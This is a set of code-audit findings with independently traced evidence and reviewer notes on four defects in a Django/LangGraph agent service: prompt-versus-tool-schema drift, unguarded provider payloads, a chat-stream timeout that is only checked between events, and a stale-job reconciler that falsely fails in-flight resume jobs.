claim: The single-tenant schema-context prompt tells the agent to call run_materialization with pipeline='<name>', but the MCP tool signature has no pipeline parameter (routing moved into materialize_workspace per-provider) and all real params are hidden, so the LLM-facing schema has zero properties for it. The multi-tenant prompt builder correctly omits the argument. Depending on FastMCP arg handling the first materialization call in a fresh single-tenant workspace either errors and retries (feeding the escalation counter) or silently drops the arg. Recurring prompt/validator drift class (#190, 93504d5).

votes.evidence:
I independently re-traced the full chain from prompt to tool contract.

1. Single-tenant prompt instructs pipeline=: apps/agents/graph/base.py:758 (`schema_context = await _fetch_schema_context(tenant, user)`) is reached for the live, common path `tenant_count == 1` (base.py:737). Inside _fetch_schema_context, the no-data-yet branch returns (base.py:222-224): `"No data has been loaded yet. Call \`run_materialization\` with " f'\`pipeline="{pipeline_name}"\` to start loading.'` So the prompt does tell the agent to pass pipeline=.

2. Multi-tenant prompt correctly omits it: base.py:769 calls _fetch_multi_tenant_schema_context, whose no-data branch (base.py:337-343) says `"Call \`run_materialization\` to start loading data for all tenants in this workspace"` — no pipeline argument. Asymmetry is real.

3. Tool has no pipeline param: mcp_server/server.py:520-527 — `run_materialization(workspace_id="", user_id="", thread_id="", tool_call_id="", ctx=None)`. No pipeline, no **kwargs. Provider routing moved into the deferred task (server.py:607: `materialize_workspace.defer_async(workspace_id=..., user_id=...)`).

4. LLM-facing schema has zero properties: base.py:504-512 sets hidden_params = ["workspace_id","user_id","thread_id","tool_call_id"]; _llm_tool_schemas (base.py:412-435) strips exactly those from the published schema. Since those four are the tool's only params, the trimmed schema is `properties: {}`, `required: []`. The LLM sees zero properties — confirms the finding.

5. Runtime behavior when LLM emits pipeline=: injecting node merges args without stripping pipeline (base.py:470: `tc = {**tc, "args": {**tc["args"], **extra}}`); langchain-mcp-adapters call_tool absorbs via `**arguments` (.venv/.../langchain_mcp_adapters/tools.py:305-307) and forwards. Server-side the arguments model is created with `__base__=ArgModelBase` (func_metadata.py:257-261), and ArgModelBase.model_config = ConfigDict(arbitrary_types_allowed=True) with NO extra setting (func_metadata.py:63-65) → Pydantic v2 default extra="ignore" → model_validate at func_metadata.py:87 silently drops pipeline. No error raised.

Stack versions verified: mcp 1.26.0 (uv.lock), mcp.server.fastmcp imported at server.py:30, langchain-mcp-adapters>=0.1 (pyproject:46).

run_materialization is a live agent tool: MCP_TOOL_NAMES includes it (base.py:71), it is @mcp.tool() decorated (server.py:520), bound to the LLM via bind_tools (base.py:522), and the single-tenant prompt path is wired into _build_system_prompt for every single-tenant workspace.
votes.notes: Confirmed, with one severity clarification on the disjunction. The finding hedges the outcome as "either errors and retries (feeding the escalation counter) or silently drops the arg." With THIS stack (mcp 1.26.0 server-side Pydantic model + langchain-mcp-adapters client), the actual behavior is deterministically the silent-drop branch — Pydantic default extra="ignore" on the args model means the bogus pipeline arg is dropped at server validation; no error, no retry, the escalation counter is NOT fed. So the more alarming sub-outcome (errors/retries/escalation) does not occur today. The defect is genuine prompt-vs-contract drift but is currently harmless at runtime: materialization still dispatches correctly because routing no longer depends on the pipeline arg. This keeps status=DEBT and impact=correctness accurate. The drift becomes a real bug only if FastMCP/Pydantic config ever flips to extra="forbid" (e.g., a future mcp version tightening validation), at which point every fresh single-tenant workspace's first materialization call would hard-error. Worth fixing by removing `pipeline="{pipeline_name}"` from base.py:222-224 to match the multi-tenant builder. The recurring drift-class framing (prompt instructing a param the contract dropped) is fair.

title: Inbound provider payload sizes/shapes unguarded: long canonical_name DataErrors swallowed, missing/empty natural keys collapse or crash writers, NUMERIC out-of-range, money precision
claim: Tenant.canonical_name (CharField 255) and User.email are filled directly from Connect/OCS/CommCare API responses with no bound; a >255-char name raises DataError mid-resolution swallowed as a login warning (user silently sees no opportunities). Writer boundary trusts every provider row has a non-null non-empty natural key: Connect visits maps visit_id BIGINT PK from raw.get('id') -> None -> NotNullViolation fails the page (same class as 2587158); many writers (Connect users, OCS sessions/experiments/participants/messages, CommCare cases/forms) default TEXT PKs to '' and ON CONFLICT, so two id-less rows silently collapse to one (wrong count, no error); OCS messages silently skips id-less sessions — three inconsistent behaviors for one condition, none logged. Connect money fields write into NUMERIC(14,2) with no range check (>=1e12 or minor-units raises NumericValueOutOfRange failing the page). Connect cursor _max_id depends on a payload 'id' field not persisted/asserted (silent resume disable / stale-watermark duplication on drift).

votes.evidence:
Re-traced every leg independently:

1. canonical_name DataError swallowed — CONFIRMED. apps/users/models.py:119 `canonical_name = models.CharField(max_length=255)`. apps/users/services/tenant_resolution.py:99-103 `Tenant.objects.aupdate_or_create(... defaults={"canonical_name": opp["name"]})` (Connect), :52-55 `domain["project_name"]` (CommCare), :156-159 `exp.get("name")` (OCS) — no truncation/bound anywhere; a >255-char provider name raises psycopg DataError. Caller apps/users/signals.py:64-78 wraps each resolver in `except Exception: logger.warning(...)`, so login succeeds with resolution aborted. Wiring is live: apps/users/apps.py:22-23 connects `resolve_tenant_on_social_login` to allauth `social_account_added`/`social_account_updated`.

2. Connect visits None PK — CONFIRMED. mcp_server/loaders/connect_visits.py:44 `"visit_id": raw.get("id")`; mcp_server/services/materializer.py:1424 `visit_id BIGINT PRIMARY KEY` and :1462 `r.get("visit_id")` — a payload row without `id` inserts NULL into the PK → NotNullViolation aborts the executemany page; exception is caught in the pipeline loop at materializer.py:328-343, source marked failed, remaining sources skipped (lines 345-350).

3. Empty-string PK collapse — CONFIRMED for: Connect users (materializer.py:1548 `r.get("username", "")` + :1284 `ON CONFLICT (username) DO UPDATE`), OCS sessions (ocs_sessions.py:50 `str(raw.get("id") or "")`, writer :927 + :1354 ON CONFLICT session_id), OCS experiments (ocs_experiments.py:21), OCS participants (:1043 + :1379), CommCare forms (:1216 `f.get("form_id", "")` + :1103 ON CONFLICT form_id). psycopg executemany issues separate INSERT statements, so same-batch '' duplicates upsert rather than error — N id-less rows silently become 1.

4. OCS messages silent skip — CONFIRMED. mcp_server/loaders/ocs_messages.py:40-42: `session_id = str(session.get("id") or "")` / `if session_id: session_ids.append(...)` — id-less sessions dropped, no log.

5. NUMERIC(14,2) money, no range check — CONFIRMED. materializer.py:1524, 1613-1616, 1696-1697, 1780-1781; raw values pass straight through (:1725-1726 `r.get("amount")` etc.); a value >= 10^12 raises numeric-out-of-range and fails the source like (2).

6. Cursor watermark — CONFIRMED as contingent. materializer.py:1237-1247 `_max_id` silently skips missing/non-int ids and returns None (no log); callback only fires when not None (:1491, 1657, 1742, 1816, 1888, 1956). Loaders for payments/completed_works/invoices/assessments/completed_modules yield raw payload rows unchanged (e.g. connect_payments.py:31), so the `id` field is an unasserted payload pass-through never persisted in the table (tables use `GENERATED ALWAYS AS IDENTITY`, :1599/1692/1778/1850/1922). Those five tables have NO ON CONFLICT (:1290-1335), so resume from a stale watermark duplicates rows; visits is protected by ON CONFLICT (visit_id).

Reachability: writers run inside the live materialization pipeline loop (materializer.py:260-310) invoked from workspace provisioning tasks; tenant resolution runs on every OAuth login via allauth signals.
votes.notes: All six legs reproduce; PARTIAL only for three mechanism corrections. (a) CommCare cases is mis-bucketed: materializer.py:1155 is `c.get("case_id")` with NO '' default, so an id-less case row NULL-crashes the source (visits-class), it does not silently collapse — only forms collapses. The "three inconsistent behaviors" claim still holds; cases just belongs in the crash bucket. (b) "none logged" overstates: the crash legs ARE logged and recorded — materializer.py:329-343 logger.exception + per-source failed state in run results (post-#229 this surfaces to agent/status API); what is genuinely unlogged is the ''-collapse and the OCS-messages skip. (c) "user silently sees no opportunities" can be partial: the resolution loop autocommits per tenant, so opportunities processed before the >255-char name persist; only the offender and everything after it vanish (and a warning IS logged server-side, just invisible to the user). Severity calibration: all legs require provider payload drift (missing ids, >255 names, >=1e12 amounts) with no evidence of current occurrence — LATENT/data-loss is correct, not BROKEN-NOW. Cheap hardening: assert/skip-and-count rows with missing natural keys at the loader boundary, truncate canonical_name to 255, and log when _max_id returns None for a non-empty page.

title: Interactive chat stream 300s timeout only checked between events: a stalled LLM/tool call hangs the SSE response and leaks the abandoned generator
claim: langgraph_to_ui_stream computes a deadline but awaits event_stream.__anext__() with no timeout, evaluating the deadline only after an event arrives; a single LLM/tool call that stalls without emitting events makes the TimeoutError branch unreachable, so the 5-minute cap can be greatly exceeded and the response hangs until client disconnect (or a downstream SDK timeout). The resume path bounds the identical ainvoke with asyncio.wait_for; the interactive path did not (fixed-where-it-bit). On the timeout/exception branches the underlying async generator is abandoned without aclose(), so the in-flight ainvoke and its Anthropic call may keep running/billing until GC.

votes.evidence:
I re-traced the full chain independently.

1) Mechanism (deadline only between events). apps/chat/stream.py:97 `event_stream = agent.astream_events(input_state, config=config, version="v2")`; line 100 `deadline = asyncio.get_event_loop().time() + AGENT_TIMEOUT_SECONDS`; line 102 `while True:`; line 103 `if asyncio.get_event_loop().time() > deadline:` then line 104 `raise TimeoutError(...)`; line 105-106 `try: event = await event_stream.__anext__()`. The `__anext__()` await has NO timeout wrapper. The deadline (line 103) is evaluated only at loop top, which is reached only after a prior event returns. A single LLM/tool call that stalls without emitting on_chat_model_stream/on_tool_end events blocks indefinitely on line 106, so the TimeoutError branch at line 212 is unreachable during the stall — the headline claim is exactly correct.

2) Resume path asymmetry confirmed. apps/workspaces/tasks.py:1161-1164 wraps the identical agent invocation in `await asyncio.wait_for(agent.ainvoke(input_state, config), timeout=timeout_s)`, which is a true wall-clock bound that cancels regardless of event emission. The interactive path retained the weaker between-events check. "fixed-where-it-bit" is accurate.

3) Generator abandonment confirmed. There is no `event_stream.aclose()` anywhere in langgraph_to_ui_stream (lines 79-249) — not in a finally, not on the TimeoutError branch (212), not on the Exception branch (226), not on normal completion. The function returns and `event_stream` (the astream_events async generator wrapping the in-flight ainvoke) is left suspended at its await, relying on async-generator finalization/GC.

4) Reachability confirmed — this is LIVE, not dead code. apps/chat/views.py:239 iterates `langgraph_to_ui_stream(agent, input_state, config)` inside `_traced_stream()`, returned via `StreamingHttpResponse` (views.py:243). `chat_view` is wired to `path("api/chat/", chat_view)` in config/urls.py:98 and the workspace-scoped thread route in apps/chat/urls.py:28. This is the primary interactive chat SSE path.

5) No upstream hard cap that restores 300s. apps/agents/graph/base.py:517-520 constructs `ChatAnthropic(model=..., max_tokens=...)` with no `timeout`/`default_request_timeout`/`max_retries`. apps/agents/mcp_client.py:51-54 builds `MultiServerMCPClient({"scout-data": {"transport": "streamable_http", "url": url}})` with no explicit tool-call timeout. A stalled MCP tool call thus blocks event production with no SDK-level Anthropic timeout to save it.

6) No test coverage for the path. grep for timeout/TimeoutError/deadline/wait_for/aclose in tests/test_mcp_chat_integration.py returns nothing; the langgraph_to_ui_stream tests (lines 410-650, 908-965) only exercise happy-path event sequences via fake async generators.
votes.notes: One mechanism nuance (does not change verdict, severity, or reachability): "hangs until client disconnect ... keep running/billing until GC" slightly overstates the absoluteness of the leak. On genuine client disconnect under Django/ASGI, GeneratorExit/CancelledError is thrown into the suspended async generator at the yield point and propagates, finalizing event_stream — so an indefinite leak specifically requires the client/proxy to hold the connection open rather than disconnect. Likewise the Anthropic SDK's own socket read timeout is an eventual (non-300s) backstop for pure-LLM stalls, though NOT for stalled MCP tool calls (which is the cleanest reproduction). The finding itself hedges with "(or a downstream SDK timeout)," so these backstops are already acknowledged. Status LATENT / impact cost-perf are appropriate: requires an actual stall (uncommon), and consequence is wasted compute/billing + a hung SSE response, not data loss or incorrect output. File/line refs in the finding are accurate (stream.py:39 = AGENT_TIMEOUT_SECONDS=300; 84-260 the streamer; 100-112 deadline+anext; 212-239 timeout/except branches; tasks.py:1161-1164 the wait_for-bounded resume).

title: Stale-job reconciler falsely fails healthy in-flight resumes for materializations whose dispatch-to-resume exceeds 10 minutes
claim: reconcile_stale_thread_job measures staleness from ThreadJob.created_at (includes full materialization + queue time) and checks the procrastinate status of the MATERIALIZE job, not the resume job (whose id is never recorded). For any materialization taking >10 min, once the resume task claims PENDING->RUNNING and enters agent.ainvoke (up to 120s), the materialize job's status is 'succeeded', so the RUNNING branch CAS-flips the ThreadJob to FAILED and injects a synthetic 'interrupted (server restart)' AIMessage into the same LangGraph thread the resume is concurrently writing. The frontend's 3s active-jobs poll runs the API-side backstop (added e91ff9b) making this near-deterministic with a tab open; the */15 worker janitor hits it probabilistically. The real answer still arrives and interleaves; the resume's terminal CAS then matches 0 rows. ThreadJob has no started_at/resume-job reference to distinguish crashed from in-flight.
chain: frontend/src/hooks/useWorkspaceJobs.ts:4 3s poll -> apps/workspaces/api/jobs_views.py:123-135 reconcile any active tj older than 10min -> apps/workspaces/tasks.py:742-748 materialize job status 'succeeded' not in {todo,doing} -> tasks.py:750-774 RUNNING CAS->FAILED + synthetic message racing tasks.py:1161 ainvoke -> tasks.py:1264-1272 resume terminal CAS matches 0 rows

votes.evidence:
Re-traced independently from entry point to consequence:

1. ThreadJob is created at dispatch with the MATERIALIZE job's procrastinate id and never updated: apps/workspaces/api/materialization_views.py:198-201 (`ThreadJob.objects.acreate(... procrastinate_job_id=job_id)`) — `procrastinate_job_id = models.BigIntegerField(unique=True)` (apps/chat/models.py:75). Grep over apps/ shows no `aupdate` of `procrastinate_job_id` anywhere; the resume task is deferred without recording its job id (apps/workspaces/tasks.py:393 `await resume_thread_after_materialization.defer_async(thread_job_id=str(tj.id))`). The model has only `created_at`/`completed_at` — no `started_at` (apps/chat/models.py:78-79), so "RUNNING since when" is unknowable.

2. Resume task claims PENDING->RUNNING then runs a long ainvoke: tasks.py:1044-1047 (`.aupdate(state=ThreadJob.State.RUNNING)`), then agent build + `await asyncio.wait_for(agent.ainvoke(...), timeout=timeout_s)` at tasks.py:1161-1164 with `AGENT_RESUME_TIMEOUT_S = 120` default (tasks.py:1127). During this whole window the ThreadJob is RUNNING in the DB.

3. Reconciler checks the wrong job and treats RUNNING+materialize-succeeded as a crash: tasks.py:742 `status = await _procrastinate_job_status(tj.procrastinate_job_id)` — the materialize job. Once the materialize task returns, its status is 'succeeded', so the `status in {"todo", "doing"}` guard at 748 passes through, and the RUNNING branch (tasks.py:750-775) CAS-flips state=RUNNING -> FAILED with error_summary "…interrupted (likely a server restart). Please retry." and calls `_persist_synthetic_failure_message(tj, RESUME_STUCK_RUNNING_MESSAGE)` (tasks.py:774), which writes a synthetic AIMessage into the SAME LangGraph thread via `agent.aupdate_state` (tasks.py:895-919) while the genuine ainvoke is concurrently writing to that thread.

4. Staleness is measured from created_at (= dispatch time, auto_now_add): worker janitor `expire_stale_thread_jobs` filters `created_at__lt=cutoff` with `STALE_JOB_THRESHOLD = timedelta(minutes=10)` (tasks.py:690, 826-833, cron "*/15" at 819); API backstop in apps/workspaces/api/jobs_views.py:123-135 does the same per-poll (`if tj.created_at >= stale_cutoff: continue` then `reconcile_stale_thread_job(tj)`). So a materialization whose dispatch-to-resume span exceeds 10 minutes enters the resume RUNNING window already past the threshold.

5. Reachability is live: `active_jobs_view` is wired at apps/workspaces/api/urls.py:34 (`path("jobs/active/", active_jobs_view)`), called by frontend/src/api/jobs.ts:52, polled by frontend/src/hooks/useWorkspaceJobs.ts with `POLL_INTERVAL_MS = 3000` (line 4) via the WorkspaceJobsContext provider. With a tab open, a 3s poll lands inside the multi-second-to-120s resume window with near certainty; the */15 janitor hits it probabilistically without a tab.

6. Consequence as claimed: the reconciler's flip makes the resume's terminal CAS (`filter(id=tj.id, state=ThreadJob.State.RUNNING).aupdate(...)`, tasks.py:1264-1271) match 0 rows; the resume logs "state changed during ainvoke; not clobbering" (1272-1288). The real agent answer is still persisted by ainvoke and interleaves with the synthetic "interrupted (server restart)" message; the ThreadJob surfaces as FAILED with retry_available=True (jobs_views.py:74-78).

Minor timing nuance (does not weaken the finding): the resume is deferred from inside the materialize task before its status flips to 'succeeded', so a poll landing in that tiny tail sees 'doing' and skips — but for essentially the entire resume window the materialize job reads 'succeeded'.
votes.notes: Every file:line in the finding's chain checked out against the actual code. The one precondition worth stating crisply: the bug fires only when dispatch-to-resume-claim exceeds 10 minutes (STALE_JOB_THRESHOLD), i.e. long materializations and/or queue wait — short runs are immune because reconcile is gated on created_at age. Given prod history of long multi-tenant/OCS loads, BROKEN-NOW is fair rather than LATENT. Healthy materializations still loading are NOT affected (materialize status 'doing' returns early at tasks.py:748); the exposure is precisely the post-success resume window. Fix direction implied by the evidence: record the resume job's procrastinate id (or a started_at/heartbeat) on ThreadJob so the RUNNING branch can check the job actually doing the work.
